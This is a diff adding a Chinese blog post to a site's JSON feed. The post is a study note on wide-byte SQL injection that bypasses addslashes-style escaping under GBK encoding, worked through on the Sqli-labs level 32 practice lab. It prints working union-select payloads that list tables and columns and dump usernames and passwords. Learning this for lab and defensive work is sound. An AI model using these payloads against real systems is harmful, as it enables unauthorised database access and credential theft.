@@ -5,6 +5,14 @@
     "home_page_url": "https://hq185187.github.io",
     "items": [
         {
+            "id": "https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/",
+            "url": "https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/",
+            "title": "宽字节注入学习",
+            "date_published": "2023-06-29T10:06:07.947Z",
+            "content_html": "<h3 id=\"先介绍几个函数\"><a class=\"markdownIt-Anchor\" href=\"#先介绍几个函数\">#</a> 先介绍几个函数</h3>\n<ol>\n<li>addslashes：在预定义字符（单引号，双引号，反斜杠，NULL）前加反斜杠</li>\n<li>mysql_real_escape_string：转义 SQL 语句中使用的字符串中的特殊字符 ( <code>\\x00,\\n,\\r,\\,',&quot;,\\x1a</code> )</li>\n</ol>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>窄字节：字符大小为一个一个字节<br>\n宽字节：字符大小为两个字节<br>\n所有英文默认占一个字节，汉字占两个字节<br>\n常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS</p>\n<p>当数据库用 GBK 编码而 PHP 用 UTF-8 编码，当防止 SQL 注入的上面的函数发挥作用，在单双引号前加了反斜杠 <code>\\</code> 。假如我们在单双引号前加一个字符，使其和斜杠组合成一个汉字，从而保留单双引号，使其发挥作用。<br>\n注意：<br>\n添加的字符 ASCII 要大于 128，两个字符才能组合成汉字，因为前一个 ascii 码要大于 128，才到汉字的范围 ，这一点需要注意，经典的有 % df</p>\n<p>例子：Sqli-labs32 关<br>\n输入 1‘会被转义成 <code>1\\'</code> <br>\n 输入 1% df’%23 就可以成功回显<br>\n然后就是常规的字符型注入<br>\n爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?id=-1%df&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>\n<p>爆列名：（这里表名要用 16 进制）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1%df&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273%23</span><br></pre></td></tr></table></figure>\n<p>爆字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1%df&#x27; union select 1,2,group_concat(username,0x7e,password)from users%23</span><br></pre></td></tr></table></figure>\n",
+            "tags": []
+        },
+        {
             "id": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
             "url": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
             "title": "Mysql主从复制",
